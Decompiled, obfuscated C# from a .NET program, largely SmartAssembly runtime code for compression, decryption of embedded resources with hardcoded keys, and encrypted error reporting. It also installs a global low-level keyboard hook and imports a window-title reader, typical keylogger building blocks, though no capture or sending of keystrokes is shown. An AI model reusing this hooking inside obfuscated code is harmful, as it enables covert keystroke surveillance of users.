	static void smethod_49(Class20.Class27 blTreeCodes, int int_0)
	{
		Class32.smethod_135(blTreeCodes.class28_2);
		Class32.smethod_135(blTreeCodes.class28_0);
		Class32.smethod_135(blTreeCodes.class28_1);
		Class32.smethod_54(blTreeCodes.class30_0, blTreeCodes.class28_0.int_1 - 257, 5);
		Class32.smethod_54(blTreeCodes.class30_0, blTreeCodes.class28_1.int_1 - 1, 5);
		Class32.smethod_54(blTreeCodes.class30_0, int_0 - 4, 4);
		for (int i = 0; i < int_0; i++)
		{
			Class32.smethod_54(blTreeCodes.class30_0, (int)blTreeCodes.class28_2.byte_0[Class20.Class27.int_8[i]], 3);
		}
		Class32.smethod_121(blTreeCodes.class28_0, blTreeCodes.class28_2);
		Class32.smethod_121(blTreeCodes.class28_1, blTreeCodes.class28_2);
	}

	static bool smethod_50(string fileName, EventArgs1 eventArgs1_0)
	{
		if (File.Exists(fileName))
		{
			File.Delete(fileName);
		}
		return Class32.smethod_52(eventArgs1_0.class35_0, fileName);
	}

	static void smethod_51(Class20.Class27.Class28 code, int int_0)
	{
		Class32.smethod_54(code.class27_0.class30_0, code.short_1[int_0] & 0xFFFF, (int)code.byte_0[int_0]);
	}

	[DllImport("kernel32")]
	static extern bool MoveFileEx(string existingFileName, string newFileName, int flags);

	static bool smethod_52(Class35 fileName, string string_0)
	{
		try
		{
			byte[] buffer = fileName.method_4();
			byte[] data;
			try
			{
				data = Class32.smethod_102(buffer);
			}
			catch
			{
				data = null;
			}
			byte[] array = Class32.smethod_3(data, "<RSAKeyValue><Modulus>y2x79cfDrPKgOkExoMO76Biksen69BJQigkd8Nb/IfE/z8j7EOVnfOaD6YzrZRydl6Qt0GOUajSivYxDCNUXSgYm/rs943DAvSk7dfF6jqVJGXN5MQr7zk/U9FPLFCN26Fd33Sv4usioR0UGZyRaVRf3Nur4hFhQVLBoLIpuwQE=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
			FileStream fileStream = File.OpenWrite(string_0);
			byte[] bytes = Encoding.ASCII.GetBytes("{C61C9459-17A0-4FB9-B2AC-64C5861D882A}");
			fileStream.Write(bytes, 0, bytes.Length);
			fileStream.Write(array, 0, array.Length);
			fileStream.Close();
			return true;
		}
		catch (ThreadAbortException)
		{
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	static void smethod_53(short[] stCodes, byte[] stLength, Class20.Class27.Class28 class28_0)
	{
		class28_0.short_1 = stCodes;
		class28_0.byte_0 = stLength;
	}

	static void smethod_54(Class20.Class30 b, int count, int int_0)
	{
		b.uint_0 |= (uint)(count << b.int_2);
		b.int_2 += int_0;
		if (b.int_2 >= 16)
		{
			b.byte_0[b.int_1++] = (byte)b.uint_0;
			b.byte_0[b.int_1++] = (byte)(b.uint_0 >> 8);
			b.uint_0 >>= 16;
			b.int_2 -= 16;
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	static byte[] smethod_55(Class35 class35_0)
	{
		return class35_0.method_4();
	}

	unsafe static bool smethod_56(Class20.Class21 class21_0)
	{
		void* ptr = stackalloc byte[13];
		int num = Class32.smethod_58(class21_0.class23_0);
		while (true)
		{
			if (num >= 258)
			{
				*(int*)((byte*)ptr + 8) = class21_0.int_17;
				switch (*(int*)((byte*)ptr + 8))
				{
				case 7:
				{
					int num2;
					while (((num2 = Class32.smethod_76(class21_0.class24_0, class21_0.class22_0)) & -256) == 0)
					{
						Class32.smethod_98(class21_0.class23_0, num2);
						if (--num >= 258)
						{
							continue;
						}
						goto IL_01e3;
					}
					if (num2 >= 257)
					{
						class21_0.int_19 = Class20.Class21.int_13[num2 - 257];
						class21_0.int_18 = Class20.Class21.int_14[num2 - 257];
						goto case 8;
					}
					if (num2 < 0)
					{
						((byte*)ptr)[12] = 0;
						break;
					}
					class21_0.class24_1 = null;
					class21_0.class24_0 = null;
					class21_0.int_17 = 2;
					((byte*)ptr)[12] = 1;
					break;
				}
				case 8:
					if (class21_0.int_18 > 0)
					{
						class21_0.int_17 = 8;
						*(int*)ptr = Class32.smethod_23(class21_0.class22_0, class21_0.int_18);
						if (*(int*)ptr < 0)
						{
							((byte*)ptr)[12] = 0;
							break;
						}
						Class32.smethod_120(class21_0.class22_0, class21_0.int_18);
						class21_0.int_19 += *(int*)ptr;
					}
					class21_0.int_17 = 9;
					goto case 9;
				case 9:
				{
					int num2 = Class32.smethod_76(class21_0.class24_1, class21_0.class22_0);
					if (num2 >= 0)
					{
						class21_0.int_20 = Class20.Class21.int_15[num2];
						class21_0.int_18 = Class20.Class21.int_16[num2];
						goto case 10;
					}
					((byte*)ptr)[12] = 0;
					break;
				}
				case 10:
					if (class21_0.int_18 > 0)
					{
						class21_0.int_17 = 10;
						*(int*)((byte*)ptr + 4) = Class32.smethod_23(class21_0.class22_0, class21_0.int_18);
						if (*(int*)((byte*)ptr + 4) < 0)
						{
							((byte*)ptr)[12] = 0;
							break;
						}
						Class32.smethod_120(class21_0.class22_0, class21_0.int_18);
						class21_0.int_20 += *(int*)((byte*)ptr + 4);
					}
					Class32.smethod_14(class21_0.class23_0, class21_0.int_19, class21_0.int_20);
					num -= class21_0.int_19;
					class21_0.int_17 = 7;
					continue;
				default:
					continue;
					IL_01e3:
					((byte*)ptr)[12] = 1;
					break;
				}
			}
			else
			{
				((byte*)ptr)[12] = 1;
			}
			break;
		}
		return ((byte*)ptr)[12] != 0;
	}

	unsafe static void smethod_57(Class20.Class29 class29_0)
	{
		void* ptr = stackalloc byte[16];
		Array.Copy(class29_0.byte_0, 32768, class29_0.byte_0, 0, 32768);
		class29_0.int_11 -= 32768;
		class29_0.int_14 -= 32768;
		class29_0.int_13 -= 32768;
		*(int*)ptr = 0;
		while (*(int*)ptr < 32768)
		{
			*(int*)((byte*)ptr + 4) = class29_0.short_0[*(int*)ptr] & 0xFFFF;
			class29_0.short_0[*(int*)ptr] = (short)((*(int*)((byte*)ptr + 4) >= 32768) ? (*(int*)((byte*)ptr + 4) - 32768) : 0);
			(*(int*)ptr)++;
		}
		*(int*)((byte*)ptr + 8) = 0;
		while (*(int*)((byte*)ptr + 8) < 32768)
		{
			*(int*)((byte*)ptr + 12) = class29_0.short_1[*(int*)((byte*)ptr + 8)] & 0xFFFF;
			class29_0.short_1[*(int*)((byte*)ptr + 8)] = (short)((*(int*)((byte*)ptr + 12) >= 32768) ? (*(int*)((byte*)ptr + 12) - 32768) : 0);
			(*(int*)((byte*)ptr + 8))++;
		}
	}

	static int smethod_58(Class20.Class23 class23_0)
	{
		return 32768 - class23_0.int_3;
	}

	static void smethod_59(Form1 form1_0)
	{
		form1_0.delegate0_0 = form1_0.method_0;
		form1_0.intptr_0 = (IntPtr)Class32.SetWindowsHookExA(13, form1_0.delegate0_0, (int)Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
	}

	static ICryptoTransform smethod_60(bool key, byte[] iv, Class19 decrypt, byte[] byte_0)
	{
		decrypt.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(decrypt.object_0, new object[1] { iv });
		decrypt.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(decrypt.object_0, new object[1] { byte_0 });
		MethodInfo method = decrypt.type_0.GetMethod(key ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(decrypt.object_0, new object[0]);
	}

	static void smethod_61(int s, Class20.Class30 class30_0)
	{
		class30_0.byte_0[class30_0.int_1++] = (byte)s;
		class30_0.byte_0[class30_0.int_1++] = (byte)(s >> 8);
	}

	static bool smethod_62(EventArgs1 eventArgs1_0)
	{
		if (!eventArgs1_0.bool_1)
		{
			return false;
		}
		return eventArgs1_0.class35_0.method_7();
	}

	static void smethod_63()
	{
		try
		{
			if (Environment.OSVersion.Platform == PlatformID.Win32NT)
			{
				MemoryManager.memoryManager_0 = new MemoryManager();
			}
		}
		catch
		{
		}
	}

	unsafe static string smethod_64(object o)
	{
		void* ptr = stackalloc byte[46];
		try
		{
			if (o == null)
			{
				return string.Empty;
			}
			if (o is int)
			{
				*(int*)((byte*)ptr + 32) = (int)o;
				return ((int*)((byte*)ptr + 32))->ToString("x");
			}
			if (o is long)
			{
				*(long*)ptr = (long)o;
				return ((long*)ptr)->ToString("x");
			}
			if (o is short)
			{
				*(short*)((byte*)ptr + 40) = (short)o;
				return ((short*)((byte*)ptr + 40))->ToString("x");
			}
			if (o is uint)
			{
				*(uint*)((byte*)ptr + 36) = (uint)o;
				return ((uint*)((byte*)ptr + 36))->ToString("x");
			}
			if (o is ulong)
			{
				*(ulong*)((byte*)ptr + 8) = (ulong)o;
				return ((ulong*)((byte*)ptr + 8))->ToString("x");
			}
			if (o is ushort)
			{
				*(ushort*)((byte*)ptr + 42) = (ushort)o;
				return ((ushort*)((byte*)ptr + 42))->ToString("x");
			}
			if (o is byte)
			{
				((byte*)ptr)[44] = (byte)o;
				return ((byte*)ptr)[44].ToString("x");
			}
			if (o is sbyte)
			{
				((byte*)ptr)[45] = (byte)(sbyte)o;
				return ((sbyte*)((byte*)ptr + 45))->ToString("x");
			}
			if (o is IntPtr intPtr)
			{
				*(long*)((byte*)ptr + 16) = intPtr.ToInt64();
				return ((long*)((byte*)ptr + 16))->ToString("x");
			}
			if (o is UIntPtr)
			{
				*(ulong*)((byte*)ptr + 24) = ((UIntPtr)o).ToUInt64();
				return ((ulong*)((byte*)ptr + 24))->ToString("x");
			}
		}
		catch
		{
		}
		return string.Empty;
	}

	unsafe static byte[] smethod_65(byte[] buffer)
	{
		void* ptr = stackalloc byte[46];
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class32.smethod_101(executingAssembly, callingAssembly))
		{
			return null;
		}
		Class20.Stream0 stream = new Class20.Stream0(buffer);
		byte[] array = new byte[0];
		*(int*)ptr = Class32.smethod_84(stream);
		if (*(int*)ptr == 67324752)
		{
			*(short*)((byte*)ptr + 44) = (short)Class32.smethod_88(stream);
			*(int*)((byte*)ptr + 4) = Class32.smethod_88(stream);
			*(int*)((byte*)ptr + 8) = Class32.smethod_88(stream);
			if (*(int*)ptr != 67324752 || *(short*)((byte*)ptr + 44) != 20 || *(int*)((byte*)ptr + 4) != 0 || *(int*)((byte*)ptr + 8) != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class32.smethod_84(stream);
			Class32.smethod_84(stream);
			Class32.smethod_84(stream);
			*(int*)((byte*)ptr + 12) = Class32.smethod_84(stream);
			*(int*)((byte*)ptr + 16) = Class32.smethod_88(stream);
			*(int*)((byte*)ptr + 20) = Class32.smethod_88(stream);
			if (*(int*)((byte*)ptr + 16) > 0)
			{
				byte[] buffer2 = new byte[*(int*)((byte*)ptr + 16)];
				stream.Read(buffer2, 0, *(int*)((byte*)ptr + 16));
			}
			if (*(int*)((byte*)ptr + 20) > 0)
			{
				byte[] buffer3 = new byte[*(int*)((byte*)ptr + 20)];
				stream.Read(buffer3, 0, *(int*)((byte*)ptr + 20));
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class20.Class21 len = new Class20.Class21(array2);
			array = new byte[*(int*)((byte*)ptr + 12)];
			Class32.smethod_112(array, array.Length, len, 0);
			array2 = null;
		}
		else
		{
			*(int*)((byte*)ptr + 24) = *(int*)ptr >> 24;
			*(int*)ptr -= *(int*)((byte*)ptr + 24) << 24;
			if (*(int*)ptr != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (*(int*)((byte*)ptr + 24) == 1)
			{
				*(int*)((byte*)ptr + 28) = Class32.smethod_84(stream);
				array = new byte[*(int*)((byte*)ptr + 28)];
				*(int*)((byte*)ptr + 32) = 0;
				while (*(int*)((byte*)ptr + 32) < *(int*)((byte*)ptr + 28))
				{
					*(int*)((byte*)ptr + 36) = Class32.smethod_84(stream);
					*(int*)((byte*)ptr + 40) = Class32.smethod_84(stream);
					byte[] array3 = new byte[*(int*)((byte*)ptr + 36)];
					stream.Read(array3, 0, array3.Length);
					Class20.Class21 len2 = new Class20.Class21(array3);
					Class32.smethod_112(array, *(int*)((byte*)ptr + 40), len2, *(int*)((byte*)ptr + 32));
					*(int*)((byte*)ptr + 32) += *(int*)((byte*)ptr + 40);
				}
			}
			if (*(int*)((byte*)ptr + 24) == 2)
			{
				byte[] iv = new byte[8] { 168, 104, 30, 20, 201, 126, 188, 190 };
				byte[] byte_ = new byte[8] { 52, 216, 110, 96, 98, 153, 21, 148 };
				using Class19 decrypt = new Class19();
				using ICryptoTransform cryptoTransform = Class32.smethod_60(key: true, iv, decrypt, byte_);
				byte[] buffer4 = cryptoTransform.TransformFinalBlock(buffer, 4, buffer.Length - 4);
				array = Class32.smethod_65(buffer4);
			}
			if (*(int*)((byte*)ptr + 24) == 3)
			{
				byte[] key = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_2 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using Class18 iv2 = new Class18();
				using ICryptoTransform cryptoTransform2 = Class32.smethod_119(key, iv2, decrypt: true, byte_2);
				byte[] buffer5 = cryptoTransform2.TransformFinalBlock(buffer, 4, buffer.Length - 4);
				array = Class32.smethod_65(buffer5);
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	[DllImport("user32", CharSet = CharSet.Unicode)]
	static extern int DrawText(IntPtr hDC, string text, int textLength, ref Class47.Struct20 lpRect, int format);

	static void smethod_66(Class35 class35_0)
	{
		class35_0.eventHandler_0?.Invoke(class35_0, EventArgs.Empty);
	}

	static void smethod_67(Class35 class35_0)
	{
		try
		{
			string tempFileName = Path.GetTempFileName();
			Class32.smethod_52(class35_0, tempFileName);
			string path = Class32.smethod_11();
			Process.Start(Path.Combine(path, "SmartAssembly.exe"), "/AddExceptionReport \"" + tempFileName + "\"");
			if (class35_0.eventHandler_0 != null)
			{
				class35_0.eventHandler_0(class35_0, EventArgs.Empty);
			}
		}
		catch (ThreadAbortException)
		{
		}
		catch (Exception fatalException)
		{
			Class32.smethod_71(class35_0, new EventArgs0(fatalException));
		}
	}

	[SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
	static unsafe void smethod_68(Class44 unhandledExceptionHandler)
	{
		if (unhandledExceptionHandler != null)
		{
			Class44.class44_0 = unhandledExceptionHandler;
			AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(unhandledExceptionHandler, (nint)(delegate*<Class44, object, UnhandledExceptionEventArgs, void>)(&Class32.smethod_160));
			Application.add_ThreadException(new ThreadExceptionEventHandler(unhandledExceptionHandler, (nint)(delegate*<Class44, object, ThreadExceptionEventArgs, void>)(&Class32.smethod_154)));
		}
	}

	unsafe static void smethod_69(Class43 class43_0)
	{
		void* ptr = stackalloc byte[8];
		try
		{
			Graphics val = ((Control)class43_0).CreateGraphics();
			try
			{
				string text = ((Control)class43_0).get_Text();
				Font font = ((Control)class43_0).get_Font();
				*(int*)((byte*)ptr + 4) = ((Control)class43_0).get_Width();
				*(int*)ptr = Class32.smethod_91(*(int*)((byte*)ptr + 4), val, text, font);
				if (*(int*)ptr > 0)
				{
					((Control)class43_0).set_Height(*(int*)ptr);
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
	}

	static void smethod_70(int value, Class20.Stream0 stream0_0)
	{
		Class32.smethod_157(value, stream0_0);
		Class32.smethod_157(value >> 16, stream0_0);
	}

	static void smethod_71(Class35 e, EventArgs0 eventArgs0_0)
	{
		e.delegate2_0?.Invoke(e, eventArgs0_0);
	}

	static void smethod_72(Class34 step, Enum2 errorMessage, string string_0)
	{
		Class32.smethod_16(step, errorMessage, string_0, string.Empty);
	}

	static void smethod_73(string name, string value, EventArgs1 eventArgs1_0)
	{
		Class32.smethod_35(name, eventArgs1_0.class35_0, (object)value);
	}

	static void smethod_74(Class19 class19_0)
	{
		class19_0.type_0.GetMethod("Clear")!.Invoke(class19_0.object_0, new object[0]);
	}

	static void smethod_75(EventArgs1 value, bool bool_0)
	{
		value.bool_2 = bool_0;
	}

	[DllImport("kernel32.Dll")]
	static extern short GetVersionEx(ref Class47.Struct21 o);

	unsafe static int smethod_76(Class20.Class24 input, Class20.Class22 class22_0)
	{
		void* ptr = stackalloc byte[20];
		int num;
		if ((num = Class32.smethod_23(class22_0, 9)) >= 0)
		{
			int num2;
			if ((num2 = input.short_0[num]) >= 0)
			{
				Class32.smethod_120(class22_0, num2 & 0xF);
				*(int*)((byte*)ptr + 16) = num2 >> 4;
			}
			else
			{
				*(int*)ptr = -(num2 >> 4);
				*(int*)((byte*)ptr + 4) = num2 & 0xF;
				if ((num = Class32.smethod_23(class22_0, *(int*)((byte*)ptr + 4))) >= 0)
				{
					num2 = input.short_0[*(int*)ptr | (num >> 9)];
					Class32.smethod_120(class22_0, num2 & 0xF);
					*(int*)((byte*)ptr + 16) = num2 >> 4;
				}
				else
				{
					*(int*)((byte*)ptr + 8) = class22_0.AvailableBits;
					num = Class32.smethod_23(class22_0, *(int*)((byte*)ptr + 8));
					num2 = input.short_0[*(int*)ptr | (num >> 9)];
					if ((num2 & 0xF) <= *(int*)((byte*)ptr + 8))
					{
						Class32.smethod_120(class22_0, num2 & 0xF);
						*(int*)((byte*)ptr + 16) = num2 >> 4;
					}
					else
					{
						*(int*)((byte*)ptr + 16) = -1;
					}
				}
			}
		}
		else
		{
			*(int*)((byte*)ptr + 12) = class22_0.AvailableBits;
			num = Class32.smethod_23(class22_0, *(int*)((byte*)ptr + 12));
			int num2 = input.short_0[num];
			if (num2 >= 0 && (num2 & 0xF) <= *(int*)((byte*)ptr + 12))
			{
				Class32.smethod_120(class22_0, num2 & 0xF);
				*(int*)((byte*)ptr + 16) = num2 >> 4;
			}
			else
			{
				*(int*)((byte*)ptr + 16) = -1;
			}
		}
		return *(int*)((byte*)ptr + 16);
	}

	static void smethod_77(Control3 sender, object e, EventArgs eventArgs_0)
	{
		sender.int_0 += 11;
		if (sender.int_0 > 198)
		{
			sender.int_0 = 0;
		}
		((Control)sender).Refresh();
	}

	unsafe static void smethod_78(Class20.Class27.Class28 blTree, Class20.Class27.Class28 class28_0)
	{
		void* ptr = stackalloc byte[20];
		*(int*)((byte*)ptr + 8) = -1;
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < blTree.int_1)
		{
			int num = 1;
			*(int*)((byte*)ptr + 16) = blTree.byte_0[*(int*)((byte*)ptr + 12)];
			if (*(int*)((byte*)ptr + 16) == 0)
			{
				*(int*)ptr = 138;
				*(int*)((byte*)ptr + 4) = 3;
			}
			else
			{
				*(int*)ptr = 6;
				*(int*)((byte*)ptr + 4) = 3;
				if (*(int*)((byte*)ptr + 8) != *(int*)((byte*)ptr + 16))
				{
					short[] short_;
					short[] array = (short_ = class28_0.short_0);
					int num2 = *(int*)((byte*)ptr + 16);
					nint num3 = num2;
					array[num2] = (short)(short_[num3] + 1);
					num = 0;
				}
			}
			*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 16);
			(*(int*)((byte*)ptr + 12))++;
			while (*(int*)((byte*)ptr + 12) < blTree.int_1 && *(int*)((byte*)ptr + 8) == blTree.byte_0[*(int*)((byte*)ptr + 12)])
			{
				(*(int*)((byte*)ptr + 12))++;
				if (++num >= *(int*)ptr)
				{
					break;
				}
			}
			if (num < *(int*)((byte*)ptr + 4))
			{
				short[] short_;
				short[] array2 = (short_ = class28_0.short_0);
				int num4 = *(int*)((byte*)ptr + 8);
				nint num3 = num4;
				array2[num4] = (short)(short_[num3] + (short)num);
			}
			else if (*(int*)((byte*)ptr + 8) != 0)
			{
				short[] short_;
				(short_ = class28_0.short_0)[16] = (short)(short_[16] + 1);
			}
			else if (num <= 10)
			{
				short[] short_;
				(short_ = class28_0.short_0)[17] = (short)(short_[17] + 1);
			}
			else
			{
				short[] short_;
				(short_ = class28_0.short_0)[18] = (short)(short_[18] + 1);
			}
		}
	}

	static void smethod_79()
	{
		try
		{
			Class13.smethod_0();
		}
		catch (Exception)
		{
		}
	}

	static void smethod_80(object[] exception, Exception objects)
	{
		if (objects == null || !(objects is SecurityException) || !(Class44.string_2 == "1") || !Class44.Handler.method_0((SecurityException)objects))
		{
			Class32.smethod_28(objects, exception);
			Class44.Handler.method_1(objects, canContinue: false, manuallyReported: false);
		}
	}

	static Exception smethod_81(object[] exception, Exception objects)
	{
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		try
		{
			if ((object)objects.GetType() == typeof(Exception) && objects.Message == "{report}")
			{
				objects = objects.InnerException;
			}
			else
			{
				Class32.smethod_28(objects, exception);
			}
			Class44.Handler.method_1(objects, canContinue: true, manuallyReported: false);
		}
		catch
		{
		}
		return (Exception)new SoapException(objects.Message, SoapException.ServerFaultCode);
	}

	unsafe static void smethod_82(Class20.Class27.Class28 class28_0)
	{
		void* ptr = stackalloc byte[36];
		*(int*)ptr = class28_0.short_0.Length;
		int[] array = new int[*(int*)ptr];
		int num = 0;
		int num2 = 0;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < *(int*)ptr)
		{
			*(int*)((byte*)ptr + 8) = class28_0.short_0[*(int*)((byte*)ptr + 4)];
			if (*(int*)((byte*)ptr + 8) != 0)
			{
				int num3 = num++;
				int num4;
				while (num3 > 0 && class28_0.short_0[array[num4 = (num3 - 1) / 2]] > *(int*)((byte*)ptr + 8))
				{
					array[num3] = array[num4];
					num3 = num4;
				}
				array[num3] = *(int*)((byte*)ptr + 4);
				num2 = *(int*)((byte*)ptr + 4);
			}
			(*(int*)((byte*)ptr + 4))++;
		}
		while (num < 2)
		{
			int num5 = ((num2 < 2) ? (++num2) : 0);
			array[num++] = num5;
		}
		class28_0.int_1 = Math.Max(num2 + 1, class28_0.int_0);
		*(int*)((byte*)ptr + 12) = num;
		int[] array2 = new int[4 * num - 2];
		int[] array3 = new int[2 * num - 1];
		int num6 = *(int*)((byte*)ptr + 12);
		*(int*)((byte*)ptr + 16) = 0;
		while (*(int*)((byte*)ptr + 16) < num)
		{
			*(int*)((byte*)ptr + 20) = array[*(int*)((byte*)ptr + 16)];
			array2[2 * *(int*)((byte*)ptr + 16)] = *(int*)((byte*)ptr + 20);
			array2[2 * *(int*)((byte*)ptr + 16) + 1] = -1;
			array3[*(int*)((byte*)ptr + 16)] = class28_0.short_0[*(int*)((byte*)ptr + 20)] << 8;
			array[*(int*)((byte*)ptr + 16)] = *(int*)((byte*)ptr + 16);
			(*(int*)((byte*)ptr + 16))++;
		}
		do
		{
			*(int*)((byte*)ptr + 24) = array[0];
			int num7 = array[--num];
			int num8 = 0;
			int num9;
			for (num9 = 1; num9 < num; num9 = num9 * 2 + 1)
			{
				if (num9 + 1 < num && array3[array[num9]] > array3[array[num9 + 1]])
				{
					num9++;
				}
				array[num8] = array[num9];
				num8 = num9;
			}
			int num10 = array3[num7];
			while ((num9 = num8) > 0 && array3[array[num8 = (num9 - 1) / 2]] > num10)
			{
				array[num9] = array[num8];
			}
			array[num9] = num7;
			*(int*)((byte*)ptr + 28) = array[0];
			num7 = num6++;
			array2[2 * num7] = *(int*)((byte*)ptr + 24);
			array2[2 * num7 + 1] = *(int*)((byte*)ptr + 28);
			*(int*)((byte*)ptr + 32) = Math.Min(array3[*(int*)((byte*)ptr + 24)] & 0xFF, array3[*(int*)((byte*)ptr + 28)] & 0xFF);
			num10 = (array3[num7] = array3[*(int*)((byte*)ptr + 24)] + array3[*(int*)((byte*)ptr + 28)] - *(int*)((byte*)ptr + 32) + 1);
			num8 = 0;
			for (num9 = 1; num9 < num; num9 = num8 * 2 + 1)
			{
				if (num9 + 1 < num && array3[array[num9]] > array3[array[num9 + 1]])
				{
					num9++;
				}
				array[num8] = array[num9];
				num8 = num9;
			}
			while ((num9 = num8) > 0 && array3[array[num8 = (num9 - 1) / 2]] > num10)
			{
				array[num9] = array[num8];
			}
			array[num9] = num7;
		}
		while (num > 1);
		Class32.smethod_158(array2, class28_0);
	}

	static int smethod_83(Class35.Struct19 typeInformation, Class35 class35_0)
	{
		string key = typeInformation.struct18_0.string_0.ToUpper();
		if (class35_0.dictionary_3.ContainsKey(key))
		{
			return class35_0.dictionary_3[key];
		}
		int count = class35_0.list_2.Count;
		class35_0.list_2.Add(typeInformation.struct18_0);
		class35_0.dictionary_3.Add(key, count);
		return count;
	}

	static int smethod_84(Class20.Stream0 stream0_0)
	{
		return Class32.smethod_88(stream0_0) | (Class32.smethod_88(stream0_0) << 16);
	}

	static int smethod_85(Class20.Class23 class23_0)
	{
		return class23_0.int_3;
	}

	unsafe static int smethod_86(Class20.Class26 output, byte[] byte_0)
	{
		void* ptr = stackalloc byte[26];
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = byte_0.Length;
		*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 4);
		while (true)
		{
			*(int*)((byte*)ptr + 12) = Class32.smethod_41(output.class30_0, byte_0, *(int*)ptr, *(int*)((byte*)ptr + 4));
			*(int*)ptr += *(int*)((byte*)ptr + 12);
			output.long_0 += *(int*)((byte*)ptr + 12);
			*(int*)((byte*)ptr + 4) -= *(int*)((byte*)ptr + 12);
			if (*(int*)((byte*)ptr + 4) != 0 && output.int_6 != 30)
			{
				Class20.Class29 class29_ = output.class29_0;
				((byte*)ptr)[24] = (((output.int_6 & 4) != 0) ? ((byte)1) : ((byte)0));
				((byte*)ptr)[25] = (((output.int_6 & 8) != 0) ? ((byte)1) : ((byte)0));
				if (Class32.smethod_36(((byte*)ptr)[24] != 0, class29_, ((byte*)ptr)[25] != 0))
				{
					continue;
				}
				if (output.int_6 != 16)
				{
					if (output.int_6 == 20)
					{
						*(int*)((byte*)ptr + 16) = 8 + (-output.class30_0.BitCount & 7);
						while (*(int*)((byte*)ptr + 16) > 0)
						{
							Class32.smethod_54(output.class30_0, 2, 10);
							*(int*)((byte*)ptr + 16) -= 10;
						}
						output.int_6 = 16;
					}
					else if (output.int_6 == 28)
					{
						Class32.smethod_144(output.class30_0);
						output.int_6 = 30;
					}
					continue;
				}
				*(int*)((byte*)ptr + 20) = *(int*)((byte*)ptr + 8) - *(int*)((byte*)ptr + 4);
				break;
			}
			*(int*)((byte*)ptr + 20) = *(int*)((byte*)ptr + 8) - *(int*)((byte*)ptr + 4);
			break;
		}
		return *(int*)((byte*)ptr + 20);
	}

	static void smethod_87()
	{
		try
		{
			Class32.smethod_97();
		}
		catch (Exception)
		{
		}
	}

	static int smethod_88(Class20.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	static void smethod_89(Class20.Class22 class22_0)
	{
		class22_0.uint_0 >>= class22_0.int_2 & 7;
		class22_0.int_2 &= -8;
	}

	static void smethod_90(Exception exceptionToWrite, Class35 class35_0)
	{
		using (new Class48(class35_0.xmlWriter_0, "Exception"))
		{
			try
			{
				Type type = exceptionToWrite.GetType();
				class35_0.method_3(type);
				string value = "N/A";
				try
				{
					value = exceptionToWrite.Message;
				}
				catch
				{
				}
				class35_0.xmlWriter_0.WriteAttributeString("Message", value);
				string text = exceptionToWrite.StackTrace!.Trim();
				class35_0.xmlWriter_0.WriteAttributeString("ExceptionStackTrace", text);
				int num = text.IndexOf(' ');
				text = text.Substring(num + 1);
				num = text.IndexOf("\r\n");
				if (num != -1)
				{
					text = text.Substring(0, num);
				}
				class35_0.xmlWriter_0.WriteAttributeString("Method", text);
				class35_0.method_1(new Class39(exceptionToWrite, firstLevel: true));
			}
			catch
			{
			}
		}
	}

	static int smethod_91(int graphics, Graphics text, string font, Font width)
	{
		try
		{
			return Class32.smethod_17(graphics, text, width, font);
		}
		catch (Exception)
		{
			try
			{
				return Convert.ToInt32((double)Class32.smethod_46(font, width, text, graphics) * 1.1);
			}
			catch (Exception)
			{
			}
		}
		return 0;
	}

	unsafe static int smethod_92(string obfuscatedName, Class35 class35_0)
	{
		void* ptr = stackalloc byte[18];
		try
		{
			((byte*)ptr)[16] = ((class35_0.char_0[0] == '\u0001') ? ((byte)1) : ((byte)0));
			if (obfuscatedName != null && obfuscatedName.Length != 0 && (((byte*)ptr)[16] == 0 || obfuscatedName.Length <= 4) && (((byte*)ptr)[16] != 0 || obfuscatedName[0] == '#'))
			{
				*(int*)ptr = 0;
				*(int*)((byte*)ptr + 4) = obfuscatedName.Length - 1;
				while (true)
				{
					if (*(int*)((byte*)ptr + 4) >= 0 && (((byte*)ptr)[16] != 0 || *(int*)((byte*)ptr + 4) != 0))
					{
						char c = obfuscatedName[*(int*)((byte*)ptr + 4)];
						((byte*)ptr)[17] = 0;
						*(int*)((byte*)ptr + 8) = 0;
						while (*(int*)((byte*)ptr + 8) < class35_0.char_0.Length)
						{
							if (class35_0.char_0[*(int*)((byte*)ptr + 8)] != c)
							{
								(*(int*)((byte*)ptr + 8))++;
								continue;
							}
							*(int*)ptr = *(int*)ptr * class35_0.char_0.Length + *(int*)((byte*)ptr + 8);
							((byte*)ptr)[17] = 1;
							break;
						}
						if (((byte*)ptr)[17] != 0)
						{
							(*(int*)((byte*)ptr + 4))--;
							continue;
						}
						*(int*)((byte*)ptr + 12) = -1;
						break;
					}
					*(int*)((byte*)ptr + 12) = *(int*)ptr;
					break;
				}
			}
			else
			{
				*(int*)((byte*)ptr + 12) = -1;
			}
		}
		catch
		{
			*(int*)((byte*)ptr + 12) = -1;
		}
		return *(int*)((byte*)ptr + 12);
	}

